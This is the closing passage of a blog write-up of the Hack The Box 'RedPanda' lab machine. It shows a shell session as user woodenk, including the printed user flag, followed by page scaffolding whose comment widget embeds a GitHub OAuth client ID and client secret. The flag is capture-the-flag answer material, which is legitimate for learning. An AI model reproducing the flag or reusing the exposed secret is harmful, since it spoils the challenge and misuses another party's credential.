  System information as of Mon 24 Oct 2022 03:15:10 AM UTC

  System load:           0.02
  Usage of /:            80.9% of 4.30GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             213
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c2


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Oct 24 03:14:58 2022 from 10.10.14.11
woodenk@redpanda:~$ whoami&amp;&amp;id
woodenk
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
</code></pre>
<p>成功拿到 user 权限的 shell</p>
<pre><code class="bash">woodenk@redpanda:~$ cat user.txt
a00d4342cd040f667d3dbfee34a49451
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&title=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&title=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2022/10/29/Hackthebox/Easy/Hackthebox-MetaTwo/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">MetaTwo - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">FriendZone - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&title=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&title=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《RedPanda - Hackthebox - 未做提权》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACqUlEQVR42u3a0Y7bMAwEwPz/T7evBe6cLrlSegXGT4aDWBoFEBlSr1d8/frjSp58ff71/unT5D2HLzw8PLxi6u9fnU80Ab8f8Wme4zfg4eHhXeMlr8sDwNOi7EJOEmAen+Ph4eH9YF40WBCQ8iXAw8PD+194eZq7Cxi7ogYeHh7e53l5CTW/n5Z6+4IvHh4e3md4eRfp59xf6e/h4eHh1V31JrXdJce7htnjbPHw8PAu8PINd4rvl2ZaMn4sc+Dh4eFd4N1LoE8FifyYV7RweHh4eDVv2rJqJpc0w/KDAtEvhoeHh3eU937IvkCQJ9nT1tfgvwIeHh7eUd70b3zesN+xl8WFaTMMDw8P7xAv2aZPVTuagmwetPDw8PBu8PLUtl/FPgAkb3glU8TDw8M7ymsaWk35dZd2jwMDHh4eXs2bHoTKt/WmGZaMO0j08fDw8K7xpq2pXWDIC767EfHw8PA+w2vKDbtw0i/KuD2Gh4eHd5Q3HT4JG/1xhGn3//G7eHh4eEd50w03LyskpeGGlCwTHh4e3j1e3uJ6xVd/VKsvjuDh4eHd400PSOUJ9PTJ2ZIHHh4e3j1eXozoSxK3Q1EU9/Dw8PAK3nSLT44aNIex8jCQp+94eHh4N3g30uLdQYF76TgeHh7eWd6OlHfnp22wvghy4BfDw8PDi3nNtj7dvhPk9PpmVnh4eHjXePkWvGueNYn4q7nw8PDwjvJ22+40He8T7rw99tjfw8PDwzvE2+2xTZuqaaoNGl1NCMHDw8OrM8+8/JovR16onabgeHh4eJ/kTYfZlSfyZtvhmIaHh4f3T3m7rXz6aV5Q/kvIwcPDw/thvOmRqQa2KzTj4eHh3eM1R6OSzbop+E6XGA8PD+82b/ePPj9o1eDzRTxcsMDDw8P7/ru/AQraSt9YCBcFAAAAAElFTkSuQmCC" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
